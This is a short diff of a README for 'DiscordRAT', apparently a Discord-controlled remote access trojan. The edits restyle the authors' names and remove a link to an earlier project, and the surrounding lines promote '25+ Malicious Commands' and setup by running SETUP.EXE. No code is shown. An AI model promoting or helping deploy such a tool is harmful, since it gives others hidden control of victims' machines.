@@ -15,7 +15,7 @@
 SET UP BY CLICKING ON THE SETUP.EXE
 
 #### DiscordRAT was made by
-PRESTON X XEN 
+𝙋𝙧𝙚𝙨𝙩𝙤𝙣 & 𝙓𝙚𝙣
 
 ## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Star This Repository If You Liked This DiscordRAT!
 
@@ -24,7 +24,7 @@ PRESTON X XEN
 * ` 25+ Malicious Commands`
 * ` Buttons and Dropdowns/selection menus`
 * ` Easy to setup and use`
-* ` Up-to-date/modern version of https://github.com/Sp00p64/DiscordRAT`
+* ` Up-to-date/modern version 
 
 ### 🤖・Commands
 ```
